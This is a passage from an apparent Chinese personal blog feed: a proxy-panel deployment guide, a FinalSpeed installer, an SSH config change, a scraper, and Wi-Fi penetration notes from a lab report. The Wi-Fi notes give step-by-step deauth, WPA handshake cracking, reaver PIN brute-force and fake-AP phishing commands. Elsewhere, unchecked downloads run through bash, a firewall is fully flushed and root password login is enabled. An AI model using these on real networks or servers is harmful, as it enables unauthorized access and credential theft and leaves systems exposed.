href="http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf">http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf</a></p><p><a href="http://pentest.cryptocity.net/files/operations/2009/post/_exploitation/_fall09.pdf">http://pentest.cryptocity.net/files/operations/2009/post\_exploitation\_fall09.pdf</a></p><p><a href="http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html">http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫初试</title>
      <link href="6c636334307d/"/>
      <url>6c636334307d/</url>
      
        <content type="html"><![CDATA[<p>#coding = utf-8<br>import re    #导入正则模块<br>import requests    #导入requests模块,第三方模块需要通过pip install requests下载<br>for page in range(1,13):    #构建循环,爬取1-13页的内容<br>    url = “<a href="https://edu.aqniu.com/course/explore?page=&quot;+&quot;page&quot;">https://edu.aqniu.com/course/explore?page=&quot;+&quot;page&quot;</a><br>    headers = {<br>        “Proxy-Connection”: “keep-alive”,<br>        “User-Agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36”,<br>        “Accept”: “text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8”,<br>        “Accept-Encoding”: “gzip, deflate”,<br>        “Accept-Language”: “zh-CN,zh;q=0.8”<br>            }                                       #构建headers,应对服务器防爬虫机制<br>    r = requests.get(url=url,headers=headers)<br>    #print(r.text)<br>    title = re.findall(‘alt=”(.*?)” class=”img-responsive” data-echo=”‘,r.text)    #利用正则模块获得re.findall(‘alt=”XXXX” class=”img-responsive” data-echo=”<br>    print(title)</p>]]></content>
      
      
      <categories>
          
          <category> python入门 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>部署安装 酸酸-Manager</title>
      <link href="0da9aeadab28/"/>
      <url>0da9aeadab28/</url>
      
        <content type="html"><![CDATA[<h3 id="ShadowSocks-Manager是一个ShadowSocks的流量账户web控制项目"><a href="#ShadowSocks-Manager是一个ShadowSocks的流量账户web控制项目" class="headerlink" title="ShadowSocks-Manager是一个ShadowSocks的流量账户web控制项目"></a>ShadowSocks-Manager是一个ShadowSocks的流量账户web控制项目</h3><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ol><li>安装<code>shadowsocks</code>，强烈推荐使用 libev 版本</li><li>安装<code>Node.js</code> 6.* 或更高版本</li><li>安装<code>ssmgr</code></li></ol><h1 id="主控端"><a href="#主控端" class="headerlink" title="主控端"></a><strong>主控端</strong></h1><ol><li>一台已经完成部署的SSMGR节点端</li><li>一个SMTP发件服务。（企业邮箱SMTP服务需要开启）</li><li>至少 512 MB 内存。</li><li>一个纯净的系统。</li></ol><p>如果你满足以上条件，那么可以开始下面的主控端部署教程。</p><h2 id="依赖安装"><a href="#依赖安装" class="headerlink" title="依赖安装"></a>依赖安装</h2><p>直接复制运行就好了 Debian/Ubuntu</p><p>apt-get -y update</p><p>apt-get -y install wget curl screen nano</p><p>CentOS/RHEL</p><p>yum install -y wget curl screen nano</p><h2 id="安装NodeJS"><a href="#安装NodeJS" class="headerlink" title="安装NodeJS"></a>安装NodeJS</h2><p>不多说，NodeJS是运行时必要的语言环境 32位的系统使用：</p><p>mkdir /usr/local/nodejs</p><ol><li>wget -N –no-check-certificate <a href="https://nodejs.org/dist/v6.9.1/node-v6.9.1-linux-x86.tar.gz">https://nodejs.org/dist/v6.9.1/node-v6.9.1-linux-x86.tar.gz</a><br>  tar -xf node-v6.9.1-linux-x86.tar.gz -C /usr/local/nodejs/<br>  rm -rf node-v6.9.1-linux-x86.tar.gz<br>  ln -s /usr/local/nodejs/node-v6.9.1-linux-x86/bin/node /usr/local/bin/node<br>  ln -s /usr/local/nodejs/node-v6.9.1-linux-x86/bin/npm /usr/local/bin/npm</li></ol><p>64位的系统使用：</p><ol><li>mkdir /usr/local/nodejs<br> wget -N –no-check-certificate <a href="https://nodejs.org/dist/v6.9.1/node-v6.9.1-linux-x64.tar.gz">https://nodejs.org/dist/v6.9.1/node-v6.9.1-linux-x64.tar.gz</a><br>  tar -xf node-v6.9.1-linux-x64.tar.gz -C /usr/local/nodejs/<br>  rm -rf node-v6.9.1-linux-x64.tar.gz<br>  ln -s /usr/local/nodejs/node-v6.9.1-linux-x64/bin/node /usr/local/bin/node<br>  ln -s /usr/local/nodejs/node-v6.9.1-linux-x64/bin/npm /usr/local/bin/npm</li></ol><p>NodeJS6就安装完成了。</p><h2 id="安装Shadowsocks-libev"><a href="#安装Shadowsocks-libev" class="headerlink" title="安装Shadowsocks-libev"></a>安装Shadowsocks-libev</h2><p>wget –no-check-certificate -O shadowsocks-all.sh <a href="https://raw.githubusercontent.com/teddysun/shadowsocks/_install/master/shadowsocks-all.sh">https://raw.githubusercontent.com/teddysun/shadowsocks\_install/master/shadowsocks-all.sh</a><br>chmod +x shadowsocks-all.sh<br>./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log</p><h2 id="安装SS-Manager"><a href="#安装SS-Manager" class="headerlink" title="安装SS-Manager"></a>安装SS-Manager</h2><ol><li>npm i -g shadowsocks-manager<br> ln -s /usr/local/nodejs/node-v6.9.1-linux-x64/bin/ssmgr /usr/local/bin/ssmgr</li></ol><h2 id="配置SS-MGR主控端信息"><a href="#配置SS-MGR主控端信息" class="headerlink" title="配置SS-MGR主控端信息"></a>配置SS-MGR<a href="https://www.zhujiboke.com/tag/%e4%b8%bb%e6%8e%a7">主控</a>端信息</h2><p>首先创建配置文件夹，编辑配置文件</p><ol><li>mkdir -p ~/.ssmgr/<br> nano ~/.ssmgr/webgui.yml</li></ol><p>请将下面的配置文件完整复制粘贴，并且按照其中的提示进行修改，请不要删减空格，否则会出错！</p><ol><li>type: m<br> empty: false<br>  <br> manager:<br>  address: 127.0.0.1:8989 #这里请将127.0.0.1和8989 设置为你节点服务器的IP和端口<br>  password: ‘123456’ #这里请讲 123456 设置为你的节点服务器SSMGR的密码，请注意两边需要 ‘ 包含起来<br> plugins:<br>  flowSaver:<br>  use: true<br>  user:<br>  use: true<br>  account:<br>  use: true<br>  pay:<br>  hour:<br>  price: 0.03<br>  flow: 500000000<br>  day:<br>  price: 0.5<br>  flow: 7000000000<br>  week:<br>  price: 3<br>  flow: 50000000000<br>  month:<br>  price: 10<br>  flow: 200000000000<br>  season:<br>  price: 30<br>  flow: 200000000000<br>  year:<br>  price: 120<br>  flow: 200000000000<br>  email:<br>  use: true<br>  username: ‘<a href="mailto:&#97;&#100;&#109;&#x69;&#110;&#x40;&#x61;&#x64;&#109;&#x69;&#110;&#x2e;&#x63;&#111;&#109;">&#97;&#100;&#109;&#x69;&#110;&#x40;&#x61;&#x64;&#109;&#x69;&#110;&#x2e;&#x63;&#111;&#109;</a>‘ #这里请填写你的发件服务器的完整邮箱地址，请注意两边需要 ‘ 包含起来<br>  password: ‘123456’ #这里请改为你发件邮箱的密码，请注意两边需要 ‘ 包含起来<br>  host: ‘smtp.mxhichina.com’ #这里请注意改为你的发件服务器的SMTP发件地址，请注意两边需要 ‘ 包含起来<br>  webgui:<br>  use: true<br>  host: ‘0.0.0.0’<br>  port: ‘80’<br>  site: ‘ss.com’ #这里请输入你的网站域名，不需要填写http:// ，请注意两边需要 ‘ 包含起来<br>  gcmSenderId: ‘456102641793’<br>  gcmAPIKey: ‘AAAAGzzdqrE:XXXXXXXXXXXXXX’<br>  alipay:<br>  use: true<br>  appid: 2015012108272442<br>  notifyUrl: ‘’<br>  merchantPrivateKey: ‘xxxxxxxxxxxx’<br>  alipayPublicKey: ‘xxxxxxxxxxx’<br>  gatewayUrl: ‘<a href="https://openapi.alipay.com/gateway.do&#39;">https://openapi.alipay.com/gateway.do&#39;</a><br> #如果想起用支付宝当面付接口，可以配置上方的信息。当然也可以不填写，就无法付款<br> db: ‘webgui.sqlite’</li></ol><p>修改完成后请保存退出。nano 的保存退出方法：按一下 Ctrl + X键，输入Y，然后回车。</p><h2 id="配置SS-Manager"><a href="#配置SS-Manager" class="headerlink" title="配置SS-Manager"></a>配置SS-Manager</h2><p>这一步是非常繁琐的，请跟着教程一步步来。 首先我们创建一个存放配置文件的文件夹在当前用户文件夹下面</p><ol><li>mkdir -p ~/.ssmgr/</li></ol><p>然后在里面新建一个文件，名字叫ss.yml</p><ol><li>nano ~/.ssmgr/ss.yml</li></ol><p>在编辑器里面输入以下内容，请注意这里的空格数量一定要对，否则会无法识别：</p><ol><li>type: s<br> empty: false<br> shadowsocks:<br>  address: 127.0.0.1:8989<br> manager:<br>  address: 0.0.0.0:9000<br>  password: 123456<br> db: ‘ss.sqlite’</li></ol><p>完成后同时按键盘 Ctrl 和 X 键，然后按一下 Y，再按一下回车即可保存此文件，回到终端命令行。如果此处不会用，请自行百度搜索 nano 编辑器的使用方法。</p><h2 id="启动节点端"><a href="#启动节点端" class="headerlink" title="启动节点端"></a><strong>启动节点端</strong></h2><p>然后启动SS-Libev的多用户模式：</p><ol><li>screen -dmS ss-manager ss-manager -m $method -u --manager-address 127.0.0.1:8989</li></ol><p>启动SSMGR的节点端程序：</p><ol><li>cd ~/.ssmgr<br> screen -dmS ssmgr ssmgr -c ss.yml<br> cd ..</li></ol><p>这两条命令之后，节点端就算是启动完毕了。可以运行 <strong>screen -ls</strong> 查看是否有两个screen在运行。如果有就没有问题，否则表示配置失败。</p><h2 id="运行主控端服务"><a href="#运行主控端服务" class="headerlink" title="运行主控端服务"></a>运行主控端服务</h2><p>下面我们运行下主控端服务，测试下到底有没有配置成功。</p><ol><li>cd ~/.ssmgr<br> ssmgr -c webgui.yml</li></ol><p>如果没有命令立刻退出，而是处于长期等待过程，那么表示配置文件没有错误，按下 Ctrl + C 可以进行下一步。否则请检查你的配置文件。</p><h2 id="开启80端口以及对应端口"><a href="#开启80端口以及对应端口" class="headerlink" title="开启80端口以及对应端口"></a>开启80端口以及对应端口</h2><p> </p><h2 id="后台保持运行SSMGR主控端"><a href="#后台保持运行SSMGR主控端" class="headerlink" title="后台保持运行SSMGR主控端"></a>后台保持运行SSMGR<a href="https://www.zhujiboke.com/tag/%e4%b8%bb%e6%8e%a7">主控</a>端</h2><p>确定配置没有问题后可以这样使得主控端后台持续运行。</p><ol><li>cd ~/.ssmgr<br> screen -dmS webgui ssmgr -c webgui.yml<br> cd ..</li></ol><h2 id="主控端开机运行脚本"><a href="#主控端开机运行脚本" class="headerlink" title="主控端开机运行脚本"></a>主控端开机运行脚本</h2><p>cd ~/.ssmgr<br>screen -dmS ss-libev ss-manager -m aes-256-cfb -u –manager-address 127.0.0.1:8989<br>screen -dmS ssmgr ssmgr -c ss.yml<br>screen -dmS webgui ssmgr -c webgui.yml<br>cd ..</p><p> </p><h1 id="节点端"><a href="#节点端" class="headerlink" title="节点端"></a><strong>节点端</strong></h1><p> </p><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a><strong>安装依赖</strong></h2><p>首先安装好系统必备的组件 Debian / Ubuntu</p><ol><li>apt-get update<br> apt-get install -y build-essential wget curl tar unzip gettext build-essential screen autoconf automake libtool openssl libssl-dev zlib1g-dev xmlto asciidoc libpcre3-dev libudns-dev libev-dev nano</li></ol><p>CentOS / RHEL</p><ol><li>yum groupinstall “Development Tools” -y<br> yum install wget curl tar unzip -y<br> yum install -y gcc gettext-devel unzip autoconf automake make zlib-devel libtool xmlto asciidoc udns-devel libev-devel<br>  yum install -y pcre pcre-devel perl perl-devel cpio expat-devel openssl-devel mbedtls-devel screen nano</li></ol><h2 id="安装NodeJS-1"><a href="#安装NodeJS-1" class="headerlink" title="安装NodeJS"></a>安装NodeJS</h2><p>因为是SSMGR是一个基于NodeJS开发的模块，所以先要安装Nodejs，版本为6.X</p><p>32位的系统使用：</p><ol><li>mkdir /usr/local/nodejs<br>  wget -N –no-check-certificate <a href="https://nodejs.org/dist/v6.9.1/node-v6.9.1-linux-x86.tar.gz">https://nodejs.org/dist/v6.9.1/node-v6.9.1-linux-x86.tar.gz</a><br>  tar -xf node-v6.9.1-linux-x86.tar.gz -C /usr/local/nodejs/<br>  rm -rf node-v6.9.1-linux-x86.tar.gz<br>  ln -s /usr/local/nodejs/node-v6.9.1-linux-x86/bin/node /usr/local/bin/node<br>  ln -s /usr/local/nodejs/node-v6.9.1-linux-x86/bin/npm /usr/local/bin/npm</li></ol><p>64位的系统使用：</p><ol><li>mkdir /usr/local/nodejs<br> wget -N –no-check-certificate <a href="https://nodejs.org/dist/v6.9.1/node-v6.9.1-linux-x64.tar.gz">https://nodejs.org/dist/v6.9.1/node-v6.9.1-linux-x64.tar.gz</a><br>  tar -xf node-v6.9.1-linux-x64.tar.gz -C /usr/local/nodejs/<br>  rm -rf node-v6.9.1-linux-x64.tar.gz<br>  ln -s /usr/local/nodejs/node-v6.9.1-linux-x64/bin/node /usr/local/bin/node<br>  ln -s /usr/local/nodejs/node-v6.9.1-linux-x64/bin/npm /usr/local/bin/npm</li></ol><p>至此，NodeJS6就安装完成了。</p><h2 id="安装SS-Libev"><a href="#安装SS-Libev" class="headerlink" title="安装SS-Libev"></a>安装SS-Libev</h2><p>wget –no-check-certificate -O shadowsocks-all.sh <a href="https://raw.githubusercontent.com/teddysun/shadowsocks/_install/master/shadowsocks-all.sh">https://raw.githubusercontent.com/teddysun/shadowsocks\_install/master/shadowsocks-all.sh</a><br>chmod +x shadowsocks-all.sh<br>./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log</p><h2 id="安装SSMGR"><a href="#安装SSMGR" class="headerlink" title="安装SSMGR"></a>安装SSMGR</h2><p>终于到了安装面板的部分了，我们直接使用NPM包管理器来安装，当然想自己编译安装的也可以参考官网上的步骤来。</p><ol><li>npm i -g shadowsocks-manager<br> ln -s /usr/local/nodejs/node-v6.9.1-linux-x64/bin/ssmgr /usr/local/bin/ssmgr</li></ol><p>如果没有一大串<strong>红色</strong>的错误，那么说明你安装完成了。</p><h2 id="配置SS-Manager-1"><a href="#配置SS-Manager-1" class="headerlink" title="配置SS-Manager"></a>配置SS-Manager</h2><p>这一步是非常繁琐的，请跟着教程一步步来。 首先我们创建一个存放配置文件的文件夹在当前用户文件夹下面</p><ol><li>mkdir -p ~/.ssmgr/</li></ol><p>然后在里面新建一个文件，名字叫ss.yml</p><ol><li>nano ~/.ssmgr/ss.yml</li></ol><p>在编辑器里面输入以下内容，请注意这里的空格数量一定要对，否则会无法识别：</p><ol><li>type: s<br> empty: false<br> shadowsocks:<br>  address: 127.0.0.1:8989<br> manager:<br>  address: 0.0.0.0:9000<br>  password: 123456<br> db: ‘ss.sqlite’</li></ol><p>完成后同时按键盘 Ctrl 和 X 键，然后按一下 Y，再按一下回车即可保存此文件，回到终端命令行。如果此处不会用，请自行百度搜索 nano 编辑器的使用方法。 <strong>6.启动节点端</strong> 然后启动SS-Libev的多用户模式：</p><ol><li>screen -dmS ss-manager ss-manager -m aes-256-cfb -u --manager-address 127.0.0.1:8989</li></ol><p>启动SSMGR的节点端程序：</p><ol><li>cd ~/.ssmgr<br> screen -dmS ssmgr ssmgr -c ss.yml<br> cd ..</li></ol><p>这两条命令之后，节点端就算是启动完毕了。可以运行 <strong>screen -ls</strong> 查看是否有两个screen在运行。如果有就没有问题，否则表示配置失败。</p><h2 id="配置防火墙"><a href="#配置防火墙" class="headerlink" title="配置防火墙"></a><strong>配置防火墙</strong></h2><p>iptables -P INPUT ACCEPT<br>iptables -P FORWARD ACCEPT<br>iptables -P OUTPUT ACCEPT<br>iptables -F</p><h2 id="节点端开机运行脚本"><a href="#节点端开机运行脚本" class="headerlink" title="节点端开机运行脚本"></a><strong>节点端开机运行脚本</strong></h2><p>cd ~/.ssmgr<br>screen -dmS ss-libev ss-manager -m aes-256-cfb -u –manager-address 127.0.0.1:8989<br>screen -dmS ssmgr ssmgr -c ss.yml<br>cd ..</p>]]></content>
      
      
      <categories>
          
          <category> centos7运维笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>FinalSpeed安装</title>
      <link href="160880c94ddb/"/>
      <url>160880c94ddb/</url>
      
        <content type="html"><![CDATA[<h1 id="FinalSpeed"><a href="#FinalSpeed" class="headerlink" title="FinalSpeed"></a>FinalSpeed</h1><p>FinalSpeed是高速双边加速软件,可加速所有基于tcp协议的网络服务,在高丢包和高延迟环境下,仍可达到90%的物理带宽利用率,即使高峰时段也能轻松跑满带宽.</p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a><a href="https://github.com/91yun/finalspeed#%E8%AF%B4%E6%98%8E"></a>说明</h3><p>finalspeed作者开始卖收费版了，所以停止了免费版的更新，并且删除了所有代码。不过还好我fork了一份。。作为Openvz的救星，还是有不少人对finalspeed有需求的。所以我就做了这个一键安装包。</p><p>这个一键安装包完全重写了作者原来的安装代码，启动，停止代码。并加入了服务，可以使用 service finalspeed star | stop 来控制，加入了开机启动启动。总之，你需要做的就是真正的一键。一键安装包安装的服务器端版本为1.2.需要1.0的自行到github下载。欢迎大家测试，有问题及时留言给我。</p><p>github地址：<a href="https://github.com/91yun/finalspeed">https://github.com/91yun/finalspeed</a></p><p>github里也有服务器端和客户端的文件。大家有需求可以自行去下载。</p><h3 id="一键安装代码："><a href="#一键安装代码：" class="headerlink" title="一键安装代码："></a><a href="https://github.com/91yun/finalspeed#%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E4%BB%A3%E7%A0%81"></a>一键安装代码：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -N --no-check-certificate https://raw.githubusercontent.com/91yun/finalspeed/master/install_fs.sh &amp;&amp; bash install_fs.sh</span><br></pre></td></tr></table></figure><p>###一键卸载代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -N --no-check-certificate https://raw.githubusercontent.com/91yun/finalspeed/master/install_fs.sh &amp;&amp; bash install_fs.sh uninstall</span><br></pre></td></tr></table></figure><h3 id="finalspeed操作命令"><a href="#finalspeed操作命令" class="headerlink" title="finalspeed操作命令"></a><a href="https://github.com/91yun/finalspeed#finalspeed%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4"></a>finalspeed操作命令</h3><p>启动： /etc/init.d/finalspeed start</p><p>停止命令：/etc/init.d/finalspeed stop</p><p>状态命令（查看日志）：/etc/init.d/finalspeed status</p><h3 id="finalspeed安装路径"><a href="#finalspeed安装路径" class="headerlink" title="finalspeed安装路径"></a><a href="https://github.com/91yun/finalspeed#finalspeed%E5%AE%89%E8%A3%85%E8%B7%AF%E5%BE%84"></a>finalspeed安装路径</h3><p>安装路径： /fs/</p><p>日志路径：/fs/server.log</p><h3 id="finalspeed客户端"><a href="#finalspeed客户端" class="headerlink" title="finalspeed客户端"></a>finalspeed客户端</h3><p><a href="https://github.com/91yun/finalspeed/raw/master/finalspeed/_install1.12.exe">https://github.com/91yun/finalspeed/raw/master/finalspeed\_install1.12.exe</a></p>]]></content>
      
      
      <categories>
          
          <category> centos7运维笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>更改SSH登录验证密码方式</title>
      <link href="ac3f441b7215/"/>
      <url>ac3f441b7215/</url>
      
        <content type="html"><![CDATA[<p>vim /etc/ssh/sshd_config</p><p>设置为密码登陆方式</p><p>查找</p><p>PermitRootLogin yes</p><p>删除前面的#注释</p><p>查找</p><p>PasswordAuthentication no</p><p>改为</p><p>PasswordAuthentication yes</p><p>保存</p>]]></content>
      
      
      <categories>
          
          <category> centos7运维笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wifi渗透</title>
      <link href="e28d5c363ea7/"/>
      <url>e28d5c363ea7/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">airmon-ng start wlan0 #激活网卡至监视模式</span><br><span class="line">airodump-ng wlan0mon #获取附近AP 信息</span><br><span class="line">airodump-ng --bssid BSSID -c CH -w 文件位置 wlan0mon #-w 是抓的包输出目录，注意加-c</span><br><span class="line">aireplay-ng -0 10 -a BSSID -c STATION wlan0mon #-0 表示DeAuth模式，10表示攻击次数，-c是第3 步中的得到的STATION，即已连接上的客户端MAC 地址</span><br><span class="line">aircrack-ng -w Wordlists.txt CAP-01.cap #-w表示字典包的路径， CAP 表示第 1 步中保存的文件中 -01.cap 文件，因为我们对每个 AP 的尝试可能不止一次，所以 airodump-ng 会自动在文件名后加类似01，02这样的数字表示次数，所以记得最后破解的时候输入正确的 CAP 包名称</span><br></pre></td></tr></table></figure><p>以下皆为网络实验班某同学的报告内容 </p><h2 id="1-Aircrack-ng"><a href="#1-Aircrack-ng" class="headerlink" title="1.Aircrack-ng"></a>1.Aircrack-ng</h2><h3 id="1-1无线网卡调成监听模式-通过输入"><a href="#1-1无线网卡调成监听模式-通过输入" class="headerlink" title="1.1无线网卡调成监听模式 通过输入"></a>1.1无线网卡调成监听模式 通过输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iwconfig</span><br></pre></td></tr></table></figure><p>查看无线网卡的interface。这个命令专用于查看无线网卡，不像ifconfig那样查看所有适配器。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure><p>来把无线网卡装换成监听模式 1.2探测无线网络，抓取无线数据包 在激活无线网卡后，我们就可以开启无线数据包抓包工具了，这里我们使用Aircrack-ng套装里的airmon-ng工具来实现，具体命令如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">airodump-ng mon0</span><br></pre></td></tr></table></figure><p>这里我们可以看到附近已开启的AP的名字和mac地址，频道和保护协议等。在这里选择你要攻击的AP。我们就可以开启无线数据包抓包工具了，这里我们使用Aircrack-ng套装里的airodump-ng工具来实现，具体命令如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">airodump-ng -c 6 –w longas mon0</span><br></pre></td></tr></table></figure><h3 id="1-3-进行Deauth攻击加速破解过程。-这里为了获得破解所需的WPA-PSK握手验证的整个完整数据包，无线黑客们将会发送一种称之为“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，黑客们也就有机会捕获到包含WPA-PSK握手验证的完整数据包了。此处具体输入命令如下："><a href="#1-3-进行Deauth攻击加速破解过程。-这里为了获得破解所需的WPA-PSK握手验证的整个完整数据包，无线黑客们将会发送一种称之为“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，黑客们也就有机会捕获到包含WPA-PSK握手验证的完整数据包了。此处具体输入命令如下：" class="headerlink" title="1.3 进行Deauth攻击加速破解过程。 这里为了获得破解所需的WPA-PSK握手验证的整个完整数据包，无线黑客们将会发送一种称之为“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，黑客们也就有机会捕获到包含WPA-PSK握手验证的完整数据包了。此处具体输入命令如下："></a>1.3 进行Deauth攻击加速破解过程。 这里为了获得破解所需的WPA-PSK握手验证的整个完整数据包，无线黑客们将会发送一种称之为“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，黑客们也就有机会捕获到包含WPA-PSK握手验证的完整数据包了。此处具体输入命令如下：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aireplay-ng -0 1 –a AP的mac -c 客户端的mac wlan0</span><br></pre></td></tr></table></figure><p>等一会儿回到airodump-ng的界面查看我们可以看到在右上角出现了“WPA handshake”的提示，这表示获得到了包含WPA-PSK密码的4此握手数据报文，至于后面是目标AP的MAC，这里的AP指的就是要破解的无线路由器。开始破解WPA-PSK。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aircrack-ng -w dic</span><br></pre></td></tr></table></figure><p>捕获的cap文件 一般捕获的cap或ivs文件在root下。然后就是等着工具用自身携带的字典破解这个密码。</p><p>Aircrack-ng这个工具是比较全面的工具，它适用于WPS,WPA。并且这个工具kali环境自带，所以不用花费时间配置工具环境。</p><h2 id="2-reaver"><a href="#2-reaver" class="headerlink" title="2.reaver"></a>2.reaver</h2><h3 id="2-1无线网卡调成监听模式-首先也是跟第一个工具一样，用前面一样的命令开启监听模式，并且"><a href="#2-1无线网卡调成监听模式-首先也是跟第一个工具一样，用前面一样的命令开启监听模式，并且" class="headerlink" title="2.1无线网卡调成监听模式 首先也是跟第一个工具一样，用前面一样的命令开启监听模式，并且"></a>2.1无线网卡调成监听模式 首先也是跟第一个工具一样，用前面一样的命令开启监听模式，并且</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan</span><br></pre></td></tr></table></figure><p>扫描附近的wifi。这样就这剩下破解了。</p><h3 id="2-2破解WPA密码-在终端中执行下列命令，用你实际获取到的BSSID替换命令中的bssid："><a href="#2-2破解WPA密码-在终端中执行下列命令，用你实际获取到的BSSID替换命令中的bssid：" class="headerlink" title="2.2破解WPA密码 在终端中执行下列命令，用你实际获取到的BSSID替换命令中的bssid："></a>2.2破解WPA密码 在终端中执行下列命令，用你实际获取到的BSSID替换命令中的bssid：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reaver -i moninterface -b bssid -vv</span><br></pre></td></tr></table></figure><p>例如，如果你和我一样，监控接口都叫做mon0，并且你要破解的路由器BSSID是8D:AE:9D:65:1F:B2，那么命令应该是下面这个样子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -vv</span><br></pre></td></tr></table></figure><p>Reaver将会通过暴力破解，尝试一系列PIN码，这将会持续一段时间，这样就等着破解，这个破解时间略长。4~10个小时不等。 Reaver这个工具跑Pin的，但是它太容易搜索不到AP所在的频道，还有就是它跑PIN码很慢。这个工具也是kali自带的。</p><h2 id="3-wifiphisher"><a href="#3-wifiphisher" class="headerlink" title="3.wifiphisher"></a>3.wifiphisher</h2><p>这个工具有点特殊你需要两个无线网卡，建议本地一个无线，在插上一个usb无线网卡，这个工具在github可以下载，并且工具是由Python写的，安装命令如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Python setup.py install</span><br></pre></td></tr></table></figure><p>然后安装成功后，开启工具：wifiphisher</p><p>它会先检查你有没有两个无线网卡，有的话，直接扫描附近wifi，并且给你列出来，前面带着序号，可以选择序号按下回车就可以开始攻击。</p><p>攻击的时候它会给你三个选项。</p><p>出现1、2、3三种模式，这三种模式代表发送不同的验证页面给连接的用户，具体的页面文件在wifiphisher目录下的 attack page中。也可以自己写一个。</p><p>敲下回车，Wifiphisher会显示正在使用的界面，还有正被攻击及复制的AP所在的SSID。</p><p>然后已连接件被攻击wifi的用户会被强制断开，wifiphisher会copy这个被攻击的wifi，做一个伪装wifi（原理就如第二步），然后断开的用户将会再搜索到的是这个伪装wifi，当他们连接这个wifi时会接受到一个验证页面（3种模式有3种不同的页面），然后会要求用户输入密码，当用户输入密码提交后，你将会看见这个密码。</p><p>这个工具是一种钓鱼工具，它会强制断掉你与wifi的链接，并且设立假AP让你联入，然后让你重新输入密码，它会返回握手包给真路由器，如果密码是对的，那么我们就知道密码了，如果是错的那么它会返回你说这是错误密码。</p><p>Wifiphisher这个工具稳定性较差，它时不时的会突然出现错误，我查了错误后是说它utf-8缺了，字符串会报错，但是看了源代码是由这个的，也会出其他错误，稳定性极差。</p><h2 id="4-wifipumpkin"><a href="#4-wifipumpkin" class="headerlink" title="4.wifipumpkin"></a>4.wifipumpkin</h2><p>Wifipumpkin这个工具也是在github里就可以下载的，并且它是有友好的界面，所以操作起来很方便。</p><p>主要功能</p><p>1.Rouge Wi-Fi接入点功能</p><p>2.Deauth攻击目标客户端AP功能</p><p>3.探测请求监测功能</p><p>4.Crendentials凭证监视功能</p><p>5.DHCP攻击</p><p>6.虚假的MAC地址广播DHCP请求攻击</p><p>7.HSTS劫持攻击功能</p><p>8.支持 airodump扫描检测功能</p><p>9.支持mkd3洪水攻击</p><p>10.支持beef hook功能</p><p>11.可生成html日志</p><p>12.支持Mac地址变换功能</p><p>13.支持ARP攻击</p><p>14.支持DNS欺骗功能</p><p>这个工具的功能很强大，可以钓鱼，可以暴力破解，可以ARP毒化攻击。并且在钓鱼功能里，它是可以自己编写钓鱼页面的，也能建立假的AP，并且可以看到你浏览的图片，还有浏览的网址，其下方可以看见你在页面上输入的账号密码等。功能很强大。界面友好。</p><p> </p><p> </p><h2 id="5-Fluxion"><a href="#5-Fluxion" class="headerlink" title="5.Fluxion"></a>5.Fluxion</h2><p>Fluxion也是一个钓鱼工具，可在github里下载。下面以我们实验班wifi为对象做实例：</p><ul><li>打开fluxion，代码为：./fluxion 在打开后先选择一个语言。后面的提示语言都变成你选择的语言。</li></ul><p><img src="/images/%E5%9B%BE%E7%89%871.png"></p><ul><li>选择信道，有两种，一个所有信道，一个选择信道，这里就选择所有信道就好。</li></ul><p><img src="/images/%E5%9B%BE%E7%89%872.png"></p><ul><li>选择所有信道之后，它会自动扫描附近的AP，发现我们的目标TP-LINK A18C98，ctrl+c退出。</li></ul><p><img src="/images/%E5%9B%BE%E7%89%873.png"></p><ul><li>Ctrl+c后自动回到terminal，选择目标，输入对应的序号。输入</li></ul><p><img src="/images/%E5%9B%BE%E7%89%874.png"></p><ul><li>选择目标后，会出现wifi的信息，比如mac地址，名字，频道，带宽等。我们选择伪装AP的钓鱼攻击。输入</li></ul><p><img src="/images/%E5%9B%BE%E7%89%875.png"></p><ul><li>握手包检查，用第一种pyrit。</li></ul><p><img 